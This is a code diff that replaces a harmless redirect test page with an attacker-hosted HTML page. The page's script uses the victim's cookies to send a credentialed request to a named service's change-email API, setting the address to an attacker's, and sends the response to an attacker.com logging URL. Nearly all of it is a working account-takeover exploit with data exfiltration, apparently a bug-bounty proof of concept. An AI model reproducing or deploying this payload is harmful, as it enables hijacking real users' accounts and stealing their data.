@@ -1,10 +1,20 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>Redirect PoC</title>
-<h3>Redirect PoC — Safe page</h3>
-<p><strong>location.href:</strong> <span id="href"></span></p>
-<p><strong>document.referrer:</strong> <span id="ref"></span></p>
+<!-- Host this on attacker.com -->
+<html>
+<body>
 <script>
-  document.getElementById('href').textContent = location.href;
-  document.getElementById('ref').textContent = document.referrer || '[no referrer]';
+fetch('https://members-api.zerobounce.net/api/customers/request-change-email/', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  credentials: 'include', // Include cookies
+  body: JSON.stringify({
+    new_email: 'attacker@evil.com',
+    confirmed_new_email: 'attacker@evil.com'
+  })
+})
+.then(r => r.text())
+.then(d => fetch('https://attacker.com/log?data=' + encodeURIComponent(d)));
 </script>
+</body>
+</html>
